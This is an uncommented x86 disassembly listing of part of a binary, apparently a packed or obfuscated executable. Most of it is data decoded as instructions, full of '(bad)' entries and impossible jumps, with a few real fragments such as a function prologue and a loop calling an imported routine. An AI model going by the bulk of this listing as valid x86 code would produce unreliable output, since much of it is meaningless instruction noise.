  4098c9:	pop    ss
  4098ca:	cmp    eax,0x79ce6035
  4098cf:	push   ebx
  4098d0:	ins    DWORD PTR es:[edi],dx
  4098d1:	jns    0x40985b
  4098d3:	int3   
  4098d4:	cmp    al,BYTE PTR ds:0x47bf992d
  4098da:	(bad)  
  4098db:	aad    0x7d
  4098dd:	or     al,al
  4098df:	popa   
  4098e0:	ins    DWORD PTR es:[edi],dx
  4098e1:	cmc    
  4098e2:	aas    
  4098e3:	fdivr  DWORD PTR [ebx]
  4098e5:	out    dx,al
  4098e6:	(bad)  
  4098e7:	and    al,ch
  4098e9:	fs push esi
  4098eb:	pop    ecx
  4098ec:	xor    al,0x7
  4098ee:	leave  
  4098ef:	aam    0x85
  4098f1:	aas    
  4098f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098f3:	ins    DWORD PTR es:[edi],dx
  4098f4:	adc    dh,BYTE PTR [esi]
  4098f6:	mov    esp,0x2a69f104
  4098fb:	inc    ebx
  4098fc:	stos   BYTE PTR es:[edi],al
  4098fd:	push   ebp
  4098fe:	fdiv   QWORD PTR [esi-0x8b7ed1c]
  409904:	neg    DWORD PTR [ecx]
  409906:	and    BYTE PTR [ebx+edx*8+0x5926fc62],0xbc
  40990e:	fisub  WORD PTR [ebp-0x7200b19]
  409914:	xchg   DWORD PTR [esi],ebx
  409916:	or     BYTE PTR [edx],bh
  409918:	clc    
  409919:	loope  0x40997f
  40991b:	cdq    
  40991c:	jg     0x4098b8
  40991e:	xchg   ebx,eax
  40991f:	dec    ebp
  409920:	call   0xf426:0xee9fbd51
  409927:	add    dl,bh
  409929:	fistp  WORD PTR [ebp+0x1223df6b]
  40992f:	xor    al,0x9c
  409931:	out    0xc,eax
  409933:	add    eax,0xeefa16c4
  409938:	xor    al,0xf
  40993a:	mov    WORD PTR [edi+0x3c],gs
  40993d:	(bad)  
  40993e:	in     al,0xf4
  409940:	mov    ebx,0x96bf9fae
  409945:	rcl    DWORD PTR [ecx-0x5e],0xac
  409949:	xor    DWORD PTR [ecx],ebp
  40994b:	mov    al,0xbb
  40994d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40994e:	fprem  
  409950:	js     0x40999c
  409952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409953:	pop    ebp
  409954:	xchg   esp,eax
  409955:	outs   dx,DWORD PTR ds:[esi]
  409956:	add    al,BYTE PTR [edi]
  409958:	mov    al,ds:0xfe5ef08b
  40995d:	add    al,0x9a
  40995f:	inc    ebx
  409960:	shl    esp,0x65
  409963:	mov    ebp,edx
  409965:	push   ecx
  409966:	mov    cl,0x2c
  409968:	les    esi,FWORD PTR [edx-0xc]
  40996b:	arpl   WORD PTR [eax+0x52],si
  40996e:	sar    BYTE PTR [ebx],1
  409970:	fs in  al,dx
  409972:	fsub   QWORD PTR [esi+edx*8+0x38]
  409976:	push   es
  409977:	pop    esp
  409978:	sbb    bl,ah
  40997a:	jbe    0x40990f
  40997c:	xchg   ecx,eax
  40997d:	push   eax
  40997e:	and    esp,DWORD PTR [edi+0x3b959418]
  409984:	loope  0x40995f
  409986:	xor    DWORD PTR [ebp+0xa],0x3c62cfc4
  40998d:	xor    esp,DWORD PTR [edx-0x34]
  409990:	pop    ss
  409991:	test   eax,0x6ab9288f
  409996:	mov    DWORD PTR [ebx-0x26],esi
  409999:	xor    al,BYTE PTR [edi+0x74]
  40999c:	in     al,0x62
  40999e:	(bad)  
  40999f:	mov    al,0xa7
  4099a1:	stc    
  4099a2:	inc    esp
  4099a3:	enter  0xbafe,0xe5
  4099a7:	sub    BYTE PTR [esi],al
  4099a9:	lods   eax,DWORD PTR ds:[esi]
  4099aa:	sbb    edi,edx
  4099ac:	es cmp eax,0x1e9ad450
  4099b2:	fnstcw WORD PTR [ecx+0x7dfa8aec]
  4099b8:	mov    ecx,0x20034cbd
  4099bd:	xor    esp,DWORD PTR [edx+0x15d41d1]
  4099c3:	or     BYTE PTR [edi+0x5e],bl
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e11c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e297
  4099eb:	mov    edi,DWORD PTR ds:0x42e2a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e79c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e124,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fcf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e11c
  409a3d:	sbb    DWORD PTR ds:0x42e6eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	not    DWORD PTR [edi-0x15]
  409a5b:	in     al,0x96
  409a5d:	xchg   esp,ebp
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a10
  409a66:	xchg   esi,eax
  409a67:	loopne 0x409a7a
  409a69:	inc    esi
  409a6a:	add    eax,0x6bfea5da
  409a6f:	xchg   esi,eax
  409a70:	jmp    DWORD PTR [edx]
  409a72:	cli    
  409a73:	pusha  
  409a74:	add    DWORD PTR [ebx-0x5e1560e0],0xffffff86
  409a7b:	cmp    DWORD PTR [ecx],0xd
  409a7e:	push   es
  409a7f:	popa   
  409a80:	add    al,0xdc
  409a82:	jge    0x409ace
  409a84:	lods   eax,DWORD PTR ds:[esi]
  409a85:	and    dh,dh
  409a87:	jbe    0x409a40
  409a89:	ret    0xddaa
  409a8c:	fwait
  409a8d:	jg     0x409ad1
  409a8f:	cmp    DWORD PTR [eax],esi
  409a91:	fimul  DWORD PTR [ebx]
  409a93:	ror    DWORD PTR [bx-0x35cd],cl
  409a98:	jne    0xa102c2f9
  409a9e:	jns    0x409b14
  409aa0:	daa    
  409aa1:	popf   
  409aa2:	shl    DWORD PTR ds:[ebp+ebx*1+0x72],0x4a
  409aa8:	inc    esp
  409aa9:	inc    ebx
  409aaa:	sbb    esp,ebp
  409aac:	shl    bh,0x2b
  409aaf:	loopne 0x409adc
  409ab1:	(bad)  ds:[edi]
  409ab4:	nop
  409ab5:	inc    ebp
  409ab6:	aas    
  409ab7:	nop
  409ab8:	xchg   esp,eax
  409ab9:	into   
  409aba:	jns    0x409b3a
  409abc:	add    DWORD PTR [eax+0x48],0x7
  409ac0:	cli    
  409ac1:	pop    edx
  409ac2:	maskmovq mm4,(bad)
  409ac3:	mul    DWORD PTR [ebp-0x4b]
  409ac6:	inc    eax
  409ac7:	fwait
  409ac8:	xor    bh,ah
  409aca:	xchg   esi,eax
  409acb:	cmp    al,0xdb
  409acd:	dec    ebp
  409ace:	imul   ecx,DWORD PTR [edx],0x9
  409ad1:	xchg   ebx,eax
  409ad2:	dec    ebx
  409ad3:	out    0x4b,eax
  409ad5:	les    ebp,FWORD PTR [ecx]
  409ad7:	xor    BYTE PTR [esi+0x4e],bh
  409ada:	adc    cl,dh
  409adc:	stos   BYTE PTR es:[edi],al
  409add:	xchg   ebx,eax
  409ade:	jmp    0x409ae0
  409ae0:	pshufw mm2,QWORD PTR [esi-0x25],0x24
  409ae5:	dec    ecx
  409ae6:	dec    esp
  409ae7:	popa   
  409ae8:	into   
  409ae9:	data16 fucomip st,st(2)
  409aec:	lods   al,BYTE PTR ds:[esi]
  409aed:	ret    0xff2f
  409af0:	mov    edx,DWORD PTR ds:0xed03fa8a
  409af6:	pop    edi
  409af7:	addr16 push ecx
  409af9:	dec    ebp
  409afa:	mov    DWORD PTR ds:0xfdc9d315,ecx
  409b00:	dec    ebp
  409b01:	arpl   WORD PTR [ebx],di
  409b03:	xchg   ebx,eax
  409b04:	cmp    al,0xa
  409b06:	jnp    0x409a98
  409b08:	retf   
  409b09:	sbb    eax,0x92ef1e37
  409b0e:	iret   
  409b0f:	or     eax,0x59b77f56
  409b14:	sbb    DWORD PTR [eax],ecx
  409b16:	push   edx
  409b17:	(bad)  
  409b18:	mov    cl,0x5e
  409b1a:	sub    ebp,ebp
  409b1c:	push   0xffffffb3
  409b1e:	call   0xd57f:0x34fac2db
  409b25:	sbb    eax,0x2de00223
  409b2a:	mov    eax,0xeb6664b4
  409b2f:	mov    bh,0xd6
  409b31:	cmp    DWORD PTR [esi+esi*8+0x30],ebx
  409b35:	push   0x20fd2398
  409b3a:	(bad)  [esi+edi*4]
  409b3d:	dec    eax
  409b3e:	jmp    0x3bb9:0x498fa36f
  409b45:	xor    eax,0x7d4dc89e
  409b4a:	fs pushf 
  409b4c:	out    0xa6,eax
  409b4e:	mov    bh,0x47
  409b50:	push   edx
  409b51:	iret   
  409b52:	test   BYTE PTR [ebp+0x3b],0xd4
  409b56:	test   BYTE PTR [esi],dh
  409b58:	mov    bl,0x84
  409b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b5b:	mov    ds:0xa00d46a7,eax
  409b60:	and    BYTE PTR [eax+esi*8],0xc2
  409b64:	mov    edi,0x366fbc96
  409b69:	jp     0x409b8a
  409b6b:	mov    al,0x3
  409b6d:	push   eax
  409b6e:	repz mov ebx,0x92c72010
  409b74:	pcmpgtd mm4,mm0
  409b77:	pop    DWORD PTR [eax+0x32c9cdb]
  409b7d:	bound  ebp,QWORD PTR [ecx-0x7e]
  409b80:	jg     0x409bc2
  409b82:	dec    ecx
  409b83:	sub    BYTE PTR [ebp-0x1611713],bl
  409b89:	inc    ecx
  409b8a:	call   0x653:0xfeac57de
  409b91:	xchg   ebp,eax
  409b92:	lock or cl,BYTE PTR [edx-0x29df3de7]
  409b99:	pop    ss
  409b9a:	pop    ebp
  409b9b:	addr16 or eax,0xe5f010eb
  409ba1:	in     eax,0x1f
  409ba3:	aaa    
  409ba4:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ba6:	sbb    bh,BYTE PTR [esi]
  409ba8:	xchg   ebx,eax
  409ba9:	fdivr  QWORD PTR [edx]
  409bab:	aaa    
  409bac:	jmp    0xcc2d5d6d
  409bb1:	inc    esi
  409bb2:	jbe    0x409b3e
  409bb4:	jl     0x409c04
  409bb6:	enter  0x6e43,0xd8
  409bba:	mov    ds:0xbb99dd08,al
  409bbf:	mov    bh,0x61
  409bc1:	addr16 cli 
  409bc3:	test   DWORD PTR [eax+0x209bf5d8],0xdb8fe05e
  409bcd:	and    eax,0xd444dc03
  409bd2:	loopne 0x409b6d
  409bd4:	aad    0x87
  409bd6:	push   edx
  409bd7:	xchg   edi,eax
  409bd8:	iret   
  409bd9:	call   0xb34116c8
  409bde:	pop    esi
  409bdf:	cmp    al,0xa8
  409be1:	or     BYTE PTR [eax],0x82
  409be4:	mov    ds:0x963ec87c,eax
  409be9:	mov    ds:0xeda50ea6,al
  409bee:	xchg   esi,eax
  409bef:	mov    esi,0xa5b49c0a
  409bf4:	dec    edi
  409bf5:	fnsave [eax+0xf108f40]
  409bfb:	push   ebp
  409bfc:	cmp    eax,DWORD PTR [eax+0x76]
  409bff:	ficom  DWORD PTR [ebp+0xe1437da]
  409c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c06:	or     bh,dl
  409c08:	xor    al,0x2f
  409c0a:	jne    0x409bc4
  409c0c:	stos   BYTE PTR es:[edi],al
  409c0d:	sbb    ebp,DWORD PTR [eax+0x6f827b9c]
  409c13:	imul   ecx,DWORD PTR [edi-0x71],0x6f
  409c17:	jge    0x409c5d
  409c19:	mov    al,0x33
  409c1b:	call   DWORD PTR [edx-0x31725d68]
  409c21:	and    BYTE PTR [eax-0x7c1f8d62],al
  409c27:	xchg   ebx,eax
  409c28:	imul   eax,DWORD PTR ds:0x5632858f,0xfffffffc
  409c2f:	nop
  409c30:	jecxz  0x409c4f
  409c32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c33:	lods   al,BYTE PTR ds:[esi]
  409c34:	push   edi
  409c35:	popa   
  409c36:	loop   0x409bc2
  409c38:	sbb    BYTE PTR [ecx-0x353d519b],ah
  409c3e:	(bad)  
  409c3f:	or     eax,0xbcaaa563
  409c44:	xor    ah,BYTE PTR [esi]
  409c46:	adc    al,0x6a
  409c48:	pop    ebp
  409c49:	fsub   st(5),st
  409c4b:	int3   
  409c4c:	pop    edi
  409c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c4e:	lds    ebx,FWORD PTR [esp+ebp*8+0x27]
  409c52:	cmp    eax,0xc5fb335b
  409c57:	pop    ebx
  409c58:	lahf   
  409c59:	(bad)  
  409c5a:	or     ebx,DWORD PTR [edx+0x72]
  409c5d:	rcr    bl,1
  409c5f:	enter  0x5c1b,0x7d
  409c63:	arpl   WORD PTR [ebx+0x2],dx
  409c66:	in     eax,0x74
  409c68:	xchg   esp,eax
  409c69:	jo     0x409c0f
  409c6b:	fadd   st,st(2)
  409c6d:	das    
  409c6e:	sar    DWORD PTR [ecx+ecx*8+0x22],cl
  409c72:	ins    BYTE PTR es:[edi],dx
  409c73:	jne    0x409cdd
  409c75:	sahf   
  409c76:	xlat   BYTE PTR ds:[ebx]
  409c77:	(bad)
  409c7b:	add    ebx,DWORD PTR [edi]
  409c7d:	push   edx
  409c7e:	imul   edi,DWORD PTR [ebx],0x5e3d6d2
  409c84:	test   ah,al
  409c86:	sub    eax,0x433a902d
  409c8b:	pop    ecx
  409c8c:	jp     0x409c30
  409c8e:	add    ch,BYTE PTR [ebx]
  409c90:	cmc    
  409c91:	out    0xb,eax
  409c93:	cdq    
  409c94:	(bad)  
  409c95:	retf   
  409c96:	mov    bh,0xfa
  409c98:	repnz xchg ebp,eax
  409c9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c9b:	jb     0x409ce8
  409c9d:	movups xmm5,xmm3
  409ca0:	xor    esp,ebx
  409ca2:	ret    
  409ca3:	pop    ss
  409ca4:	add    eax,0xc55ba300
  409ca9:	jg     0x409c60
  409cab:	cwde   
  409cac:	or     DWORD PTR [esi],0x2651dcd8
  409cb2:	jmp    0xf7b:0xbf184b0d
  409cb9:	retf   0x7943
  409cbc:	mov    esi,0x6c044da5
  409cc1:	pop    esi
  409cc2:	std    
  409cc3:	retf   0xf22d
  409cc6:	clc    
  409cc7:	cs inc edi
  409cc9:	push   ebp
  409cca:	imul   edi,DWORD PTR [edi-0x6a],0x6
  409cce:	dec    di
  409cd0:	call   0xb662:0x555a
  409cd6:	cwde   
  409cd7:	xchg   esi,eax
  409cd8:	(bad)  
  409cd9:	sbb    ah,BYTE PTR [edx-0x3f]
  409cdc:	leave  
  409cdd:	mov    ds:0x5b21411a,al
  409ce2:	mov    eax,0x79a4f7ae
  409ce7:	jge    0x409d2a
  409ce9:	std    
  409cea:	jmp    0x409cbd
  409cec:	fldenv [eax+0x17]
  409cef:	dec    esp
  409cf0:	dec    esp
  409cf1:	jp     0x409d51
  409cf3:	test   WORD PTR [edx],dx
  409cf6:	outs   dx,DWORD PTR ds:[esi]
  409cf7:	push   es
  409cf8:	js     0x409ceb
  409cfa:	es addr16 jno 0x409d5c
  409cfe:	jo     0x409ce3
  409d00:	stos   BYTE PTR es:[edi],al
  409d01:	jb     0x409cc6
  409d03:	retf   
  409d04:	dec    esi
  409d05:	mov    ecx,0xf8fea1a1
  409d0a:	cmp    BYTE PTR [esi*8-0x55a792df],0x41
  409d12:	shr    BYTE PTR [edi-0x45a90690],0x97
  409d19:	lods   al,BYTE PTR ds:[esi]
  409d1a:	iret   
  409d1b:	ror    DWORD PTR [ecx+0x52],0x8b
  409d1f:	pop    ebx
  409d20:	mov    edi,0x44f8eb9d
  409d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d26:	push   edi
  409d27:	test   ax,0xdb15
  409d2b:	fdivr  DWORD PTR ds:0x67451bc0
  409d31:	push   edx
  409d32:	out    dx,eax
  409d33:	xchg   edx,eax
  409d34:	dec    esi
  409d35:	rol    DWORD PTR [esi-0x3c],0x31
  409d39:	fldenv [eax-0x28]
  409d3c:	jb     0x409d2c
  409d3e:	pop    ss
  409d3f:	jmp    0x409cd7
  409d41:	jo     0x409cd3
  409d43:	adc    ch,ch
  409d45:	sar    edi,1
  409d47:	mov    ebx,0xa14ddc2f
  409d4c:	mov    esi,0xd4ac7586
  409d51:	mov    edx,0x75390c3c
  409d56:	mov    esp,0x5b269b84
  409d5b:	jle    0x409dcb
  409d5d:	lock enter 0x3aa2,0xc5
  409d62:	nop
  409d63:	fwait
  409d64:	inc    eax
  409d65:	mov    eax,ds:0x5767d415
  409d6a:	out    dx,eax
  409d6b:	mov    esp,DWORD PTR [ebx]
  409d6d:	icebp  
  409d6e:	pop    edi
  409d6f:	or     eax,0xd0af8884
  409d74:	mov    bl,0x42
  409d76:	pop    edi
  409d77:	mov    ecx,0x74e53ce1
  409d7c:	mov    ds:0xc2766de3,al
  409d81:	(bad)  
  409d82:	loop   0x409d37
  409d84:	push   ebp
  409d85:	jnp    0x409d96
  409d87:	sub    edi,ecx
  409d89:	xor    BYTE PTR ds:0xa1cdb515,bl
  409d8f:	in     al,0x61
  409d91:	push   ecx
  409d92:	hlt    
  409d93:	lods   al,BYTE PTR ds:[esi]
  409d94:	mov    edx,0x2b4c05e8
  409d99:	(bad)  [edx]
  409d9b:	dec    ecx
  409d9c:	(bad)  
  409d9d:	sbb    BYTE PTR [esi-0x1e],0xc3
  409da1:	xor    DWORD PTR [edx+0x68],ebp
  409da4:	push   ds
  409da5:	pop    esp
  409da6:	mov    eax,0xaae01a8b
  409dab:	adc    BYTE PTR [eax-0xe],al
  409dae:	add    ebx,DWORD PTR [ebp+0x18614abf]
  409db4:	sbb    DWORD PTR [eax+ebx*4],0x33fcd6a8
  409dbb:	sbb    edi,esi
  409dbd:	push   es
  409dbe:	sub    al,0x2e
  409dc0:	pop    esi
  409dc1:	pop    edi
  409dc2:	add    DWORD PTR [esi-0x49],esi
  409dc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dc6:	and    BYTE PTR [edx],cl
  409dc8:	jno    0x409da3
  409dca:	cmp    eax,0xf7a9ea86
  409dcf:	jl     0x409dfc
  409dd1:	jnp    0x409db5
  409dd3:	mov    ah,0x70
  409dd5:	out    0x5e,al
  409dd7:	add    eax,0xe5685279
  409ddc:	ins    DWORD PTR es:[edi],dx
  409ddd:	jle    0x409e07
  409ddf:	mov    BYTE PTR [ecx+0x7f],bh
  409de2:	(bad)  
  409de3:	in     al,dx
  409de4:	xchg   esi,eax
  409de5:	xchg   edi,eax
  409de6:	inc    esi
  409de7:	jo     0x409def
  409de9:	fisubr DWORD PTR ds:0x12c92523
  409def:	arpl   bx,si
  409df1:	adc    eax,0xff22a233
  409df6:	push   ebx
  409df7:	jle    0x409dff
  409df9:	adc    ebp,DWORD PTR [eax+esi*1-0x17baf0af]
  409e00:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e02:	xchg   ebx,eax
  409e03:	in     al,0x96
  409e05:	push   esi
  409e06:	add    edx,ecx
  409e08:	xor    DWORD PTR ds:0x42fd8a,ecx
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fcf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e124
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e2e3
  409e51:	mov    edi,DWORD PTR ds:0x42fd82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e703,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	fstp   DWORD PTR [edx-0x17d90e40]
  409e87:	jo     0x409ef9
  409e89:	lahf   
  409e8a:	jge    0x409efc
  409e8c:	jo     0x409f0d
  409e8e:	or     BYTE PTR [ebp-0x6f369db1],bl
  409e94:	mov    al,ds:0xe579d336
  409e99:	sti    
  409e9a:	addr16 cmp eax,0x4708325e
  409ea0:	jmp    0x1ccb25ba
  409ea5:	fwait
  409ea6:	jnp    0x409e72
  409ea8:	and    esi,DWORD PTR [esi]
  409eaa:	shr    DWORD PTR [ecx],1
  409eac:	fcomip st,st(3)
  409eae:	sbb    BYTE PTR [ebp+0x49],ch
  409eb1:	mov    ch,0xf7
  409eb3:	pushf  
  409eb4:	stc    
  409eb5:	or     ah,ch
  409eb7:	add    bh,BYTE PTR [eax-0x7b]
  409eba:	jl     0x409eca
  409ebc:	test   eax,0xd7fd6264
  409ec1:	nop
  409ec2:	shr    DWORD PTR [ecx+0x14],1
  409ec5:	repz inc edi
  409ec7:	in     al,0xc9
  409ec9:	stc    
  409eca:	or     eax,0xf5ed411b
  409ecf:	in     al,dx
  409ed0:	aaa    
  409ed1:	aaa    
  409ed2:	(bad)  ds:0x1d0fbc0a
  409ed8:	stos   BYTE PTR es:[edi],al
  409ed9:	dec    eax
  409eda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409edc:	popf   
  409edd:	mov    edi,0x9aaecaaf
  409ee2:	push   0x4250eaad
  409ee7:	mov    dl,0x65
  409ee9:	mov    esp,0x5abd355a
  409eee:	xor    edx,0x49
  409ef1:	sub    eax,0xafb7b954
  409ef6:	lods   al,BYTE PTR ds:[esi]
  409ef7:	pop    ebp
  409ef8:	pop    ecx
  409ef9:	scas   al,BYTE PTR es:[edi]
  409efa:	dec    edi
  409efb:	cmc    
  409efc:	xor    al,0x2a
  409efe:	stos   BYTE PTR es:[edi],al
  409eff:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f01:	push   ebx
  409f02:	or     eax,0xeace5f98
  409f07:	imul   ebp,DWORD PTR [eax+edx*4+0x18],0xfdd3f474
  409f0f:	icebp  
  409f10:	dec    eax
  409f11:	pop    eax
  409f12:	popf   
  409f13:	pop    esi
  409f14:	in     al,dx
  409f15:	les    ebx,FWORD PTR [edi-0x3b506a64]
  409f1b:	push   ss
  409f1c:	mov    ecx,0x915b8893
  409f21:	ror    BYTE PTR [esi-0x59392b3f],0x5f
  409f28:	rcl    esp,cl
  409f2a:	mov    edi,0xb2a93fc4
  409f2f:	add    BYTE PTR [esi-0x3cff5204],ah
  409f35:	mov    ds,WORD PTR [edi-0x667304d7]
  409f3b:	pop    ds
  409f3c:	ins    BYTE PTR es:[edi],dx
  409f3d:	add    esp,DWORD PTR [edi-0xc]
  409f40:	mov    DWORD PTR [edi+eiz*2-0x27],eax
  409f44:	loope  0x409fc4
  409f46:	mov    al,ds:0x64861563
  409f4b:	ss mov edi,0x9f24767a
  409f51:	pusha  
  409f52:	mov    ebp,0x5cb463b1
  409f57:	and    esp,DWORD PTR [ebp-0x20]
  409f5a:	inc    esi
  409f5b:	pop    es
  409f5c:	retf   0x7cc4
  409f5f:	rdpmc  
  409f61:	xor    eax,0x5e68d11c
  409f66:	sub    eax,0xcf774cc3
  409f6b:	(bad)  
  409f6c:	pop    esi
  409f6d:	jl     0x409eef
  409f6f:	mov    dh,0xc
  409f71:	push   edx
  409f72:	imul   ecx,DWORD PTR [edi+0x23],0x2cda8f59
  409f79:	cmc    
  409f7a:	jns    0x409f0a
  409f7c:	in     al,0xff
  409f7e:	mov    BYTE PTR [eax],bh
  409f80:	inc    edx
  409f81:	loope  0x409f6d
  409f83:	idiv   dl
  409f85:	sbb    eax,0xb4b8804b
  409f8a:	add    DWORD PTR [eax+0x64def507],ebp
  409f90:	mov    ch,0xeb
  409f92:	pop    es
  409f93:	sbb    eax,0xd0557847
  409f98:	out    dx,eax
  409f99:	sub    esp,DWORD PTR [ebx-0x17]
  409f9c:	les    esp,FWORD PTR [edi+0x1a4584e0]
  409fa2:	jno    0x409f61
  409fa4:	in     eax,0xc4
  409fa6:	adc    BYTE PTR [ecx],dh
  409fa8:	and    DWORD PTR [edx+0x6170d2b2],esi
  409fae:	xor    bl,BYTE PTR [ecx-0x48]
  409fb1:	push   0x9fea09f9
  409fb6:	lahf   
  409fb7:	clc    
  409fb8:	popf   
  409fb9:	dec    esp
  409fba:	mov    al,ds:0xd358ef4d
  409fbf:	xchg   esp,eax
  409fc0:	ja     0x409fde
  409fc2:	inc    ebx
  409fc3:	jno    0x40a026
  409fc5:	mov    ebx,0x7f00097b
  409fca:	shl    DWORD PTR [esi+eax*1],1
  409fcd:	jb     0x409fb4
  409fcf:	mov    ebp,0x87b6b4dd
  409fd4:	push   ebp
  409fd5:	stos   DWORD PTR es:[edi],eax
  409fd6:	mov    fs:0x13409478,al
  409fdc:	pop    ebx
  409fdd:	push   es
  409fde:	add    al,0xb2
  409fe0:	imul   edx,ebx,0xa423502b
  409fe6:	div    DWORD PTR [eax-0x70]
  409fe9:	cld    
  409fea:	xor    ebp,DWORD PTR [edx-0x22]
  409fed:	in     eax,0xe6
  409fef:	xchg   ebx,eax
  409ff0:	pop    eax
  409ff1:	jmp    0x9de5252d
  409ff6:	push   esp
  409ff7:	cmp    eax,0x356dc9e5
  409ffc:	call   DWORD PTR [eax+ebx*2-0x15]
  40a000:	out    0xc5,al
  40a002:	adc    eax,0x5edcfd9e
  40a007:	mov    cl,0x71
  40a009:	call   FWORD PTR [edi+0x1d8f445f]
  40a00f:	inc    esp
  40a010:	(bad)  
  40a011:	or     edi,DWORD PTR [edx]
  40a013:	cmc    
  40a014:	pop    es
  40a015:	dec    esi
  40a016:	stos   DWORD PTR es:[edi],eax
  40a017:	sub    ebx,DWORD PTR [eax]
  40a019:	mov    ecx,0x7bbeb7d4
  40a01e:	add    BYTE PTR [eax-0x1864960e],bh
  40a024:	imul   edx,DWORD PTR [edi],0x4
  40a027:	xlat   BYTE PTR ds:[ebx]
  40a028:	repnz test al,0x60
  40a02b:	push   edi
  40a02c:	sub    al,0xb4
  40a02e:	fiadd  WORD PTR [edx]
  40a030:	push   ss
  40a031:	and    eax,0xaf495293
  40a036:	xor    BYTE PTR [esi],ah
  40a038:	push   0x23dd5d69
  40a03d:	daa    
  40a03e:	dec    esi
  40a03f:	neg    BYTE PTR [ebx-0x768a7e5c]
  40a045:	nop
  40a046:	fild   QWORD PTR [ebp-0x2103fb4b]
  40a04c:	pusha  
  40a04d:	and    esp,DWORD PTR [edi]
  40a04f:	inc    ebx
  40a050:	pop    ds
  40a051:	lds    ecx,FWORD PTR [ecx]
  40a053:	jp     0x409fe2
  40a055:	fwait
  40a056:	pop    edi
  40a057:	lods   eax,DWORD PTR ds:[esi]
  40a058:	mov    BYTE PTR [edi],0x58
  40a05b:	push   0xffffffeb
  40a05d:	ss cmc 
  40a05f:	xlat   BYTE PTR ds:[ebx]
  40a060:	dec    esi
  40a061:	and    al,0x3e
  40a063:	inc    edx
  40a064:	jg     0x409ffc
  40a066:	push   es
  40a067:	pusha  
  40a068:	fisubr DWORD PTR [esi]
  40a06a:	add    BYTE PTR [esi],0x4f
  40a06d:	dec    esi
  40a06e:	push   ebp
  40a06f:	ja     0x40a0ea
  40a071:	shl    BYTE PTR [ebx+0x6ac11eea],1
  40a077:	cmp    DWORD PTR [esi+0x2e0fb45b],0x18
  40a07e:	adc    DWORD PTR [edi],eax
  40a080:	test   DWORD PTR [eax+0xa],0x5faa0494
  40a087:	iret   
  40a088:	xchg   ebx,eax
  40a089:	into   
  40a08a:	loopne 0x40a08d
  40a08c:	(bad)  
  40a08d:	dec    ecx
  40a08e:	or     DWORD PTR [ebx-0x4af1005f],ebx
  40a094:	fwait
  40a095:	rcr    bl,1
  40a097:	data16 fldcw WORD PTR [edi]
  40a09a:	in     al,0xa1
  40a09c:	js     0x40a098
  40a09e:	push   ss
  40a09f:	adc    al,0x21
  40a0a1:	(bad)  [ebp+0x26]
  40a0a4:	xchg   DWORD PTR [edx],ebx
  40a0a6:	adc    al,0x54
  40a0a8:	dec    ebx
  40a0a9:	aad    0xfd
  40a0ab:	mov    cl,0xa
  40a0ad:	lods   eax,DWORD PTR ds:[esi]
  40a0ae:	je     0x40a07e
  40a0b0:	fdivr  QWORD PTR [ecx]
  40a0b2:	loope  0x40a06d
  40a0b4:	jmp    0xeb56:0xfb335cd3
  40a0bb:	ss out dx,al
  40a0bd:	dec    eax
